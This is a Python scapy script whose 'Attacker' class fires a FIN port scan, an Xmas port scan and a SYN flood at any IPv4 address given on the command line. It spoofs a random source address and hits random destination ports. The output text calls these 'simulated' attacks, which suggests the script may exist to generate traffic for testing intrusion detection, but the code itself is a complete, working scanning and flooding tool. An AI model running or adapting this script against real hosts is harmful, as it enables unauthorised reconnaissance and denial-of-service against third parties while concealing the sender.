import time
import argparse
from scapy.all import *
from random import randint


class Attacker:
    def __init__(self, dst_ip, n_pkt, interface):
        self.source_ip = self.generate_ipv4()
        self.destination_ip = dst_ip
        self.packets_to_send = n_pkt
        self.interface = interface

    def generate_ipv4(self):
        return ".".join(map(str, (randint(0, 255) for _ in range(4))))

    def fin_port_scan(self):
        fin_packets = self.craft_packets(flags='F')
        print("    Sending {} TCP packets with the FIN flag set to simulate a FIN port scanning...".format(
            self.packets_to_send))
        send(fin_packets, iface=self.interface, verbose=0)
        print("    Done!\n")

    def xmas_port_scan(self):
        xmas_packets = self.craft_packets(flags='FPU')
        print("    Sending {} TCP packets with the FIN-PSH-URG flags set to simulate a X-Mas port scanning...".format(
            self.packets_to_send))
        send(xmas_packets, iface=self.interface, verbose=0)
        print("    Done!\n")

    def syn_flood_attack(self):
        syn_packets = self.craft_packets(flags='S')
        print("    Sending {} TCP packets with the SYN flag set to simulate a SYN Flood attack...".format(
            self.packets_to_send))
        send(syn_packets, iface=self.interface, verbose=0)
        print("    Done!\n")

    def craft_packets(self, flags):
        list_of_packets = []
        # Crafting the packets to be sent
        ip_packet = IP()
        ip_packet.src = self.source_ip
        ip_packet.dst = self.destination_ip
        ip_packet.ttl = randint(30, 70)
        ip_packet.proto = 6  # TCP is identified by number 6

        for i in range(self.packets_to_send):
            source_port = randint(3000, 10000)
            destination_port = randint(1, 65535)
            random_seq = randint(1, 1000)
            random_win_size = randint(500, 2000)

            tcp_segment = TCP()
            tcp_segment.sport = source_port
            tcp_segment.dport = destination_port
            tcp_segment.flags = flags
            tcp_segment.seq = random_seq
            tcp_segment.window = random_win_size

            list_of_packets.append(ip_packet / tcp_segment)

        return list_of_packets

    def run_attacks(self):
        print("Running attacks...\n")

        print("[1] FIN port scanning")
        self.fin_port_scan()
        time.sleep(1)  # A little pause to better divide the 3 attacks
        print("[2] X-Mas port scanning")
        self.xmas_port_scan()
        time.sleep(1)
        print("[3] SYN Flood")
        self.syn_flood_attack()


def main():
    # Handling command-line arguments
    parser = argparse.ArgumentParser(description='A script that performs some network attacks')

    parser.add_argument('-i', '--iface',
                        required=True,
                        metavar='interface name'.upper())

    parser.add_argument('-ip',
                        required=True,
                        metavar='destination ipv4 address'.upper())

    parser.add_argument('-n',
                        type=int,
                        default=600,
                        dest='pkt_to_send',
                        metavar='number of packets to send'.upper())

    args = parser.parse_args()

    attacks = Attacker(args.ip, args.pkt_to_send, args.iface)
    attacks.run_attacks()


if __name__ == '__main__':
    main()
